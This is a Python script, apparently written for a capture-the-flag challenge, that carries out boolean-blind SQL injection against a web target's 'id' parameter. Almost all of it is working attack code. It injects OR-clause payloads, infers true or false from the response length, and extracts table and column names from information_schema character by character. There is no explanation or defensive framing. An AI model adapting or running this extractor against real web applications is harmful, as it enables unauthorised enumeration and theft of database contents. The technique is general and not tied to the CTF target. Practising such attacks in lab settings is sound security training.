"""Boolean-blind SQL injection extraction for CTF target."""
import requests
import string
import sys

URL = 'http://141a2270-ba22-48d7-bd0a-158888d5b8a7.node5.buuoj.cn:81'
TIMEOUT = 10

s = requests.Session()

def check(payload):
    """True if condition matches (size=511)."""
    full = f"xxx' OR ({payload})#"
    try:
        r = s.get(URL, params={'id': full}, timeout=TIMEOUT)
        return len(r.text) == 511
    except Exception as e:
        print(f"  [error] {e}")
        return False

def extract_len(select_clause, max_len=60):
    for i in range(1, max_len + 1):
        if check(f"LENGTH(({select_clause}))={i}"):
            return i
    return 0

def extract_string(payload_template, length):
    """Extract a string character by character using boolean blind."""
    result = ''
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_ -:,.{}()!@#$%^&*+/=<>'
    for pos in range(1, length + 1):
        found = False
        for c in charset:
            if c == "'" or c == '\\':
                continue
            if check(payload_template.format(pos=pos, char=c)):
                result += c
                print(f"    [{pos}/{length}] '{c}' => {result}")
                found = True
                break
        if not found:
            result += '?'
            print(f"    [{pos}/{length}] ? (not found)")
    return result

def main():
    print("=== Extracting table names from 'ctf' database ===")

    # Get table count
    table_count = 0
    for i in range(1, 20):
        if check(f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='ctf')={i}"):
            table_count = i
            break
    print(f"Table count: {table_count}")

    tables = []
    for idx in range(table_count):
        tbl_len = extract_len(
            f"SELECT table_name FROM information_schema.tables WHERE table_schema='ctf' LIMIT {idx},1"
        )
        print(f"Table {idx}: name length = {tbl_len}")
        if tbl_len > 0 and tbl_len < 50:
            tbl_name = extract_string(
                f"SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='ctf' LIMIT {idx},1),{{pos}},1)='{{char}}'",
                tbl_len
            )
            print(f"  => Table {idx}: '{tbl_name}'")
            tables.append(tbl_name)
        else:
            tables.append(f"unknown_len{tbl_len}")
            print(f"  => Table {idx}: unknown (len={tbl_len})")

    # For each table, extract columns
    print("\n=== Extracting columns ===")
    for tbl_name in tables:
        if tbl_name.startswith('unknown'):
            continue
        print(f"\nTable: {tbl_name}")

        # Column count
        col_count = 0
        for i in range(1, 20):
            if check(f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='ctf' AND table_name='{tbl_name}')={i}"):
                col_count = i
                break
        print(f"  Column count: {col_count}")

        for cidx in range(col_count):
            col_len = extract_len(
                f"SELECT column_name FROM information_schema.columns WHERE table_schema='ctf' AND table_name='{tbl_name}' LIMIT {cidx},1"
            )
            print(f"  Column {cidx}: name length = {col_len}")
            if 0 < col_len < 50:
                col_name = extract_string(
                    f"SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='ctf' AND table_name='{tbl_name}' LIMIT {cidx},1),{{pos}},1)='{{char}}'",
                    col_len
                )
                print(f"    => '{col_name}'")

if __name__ == '__main__':
    main()
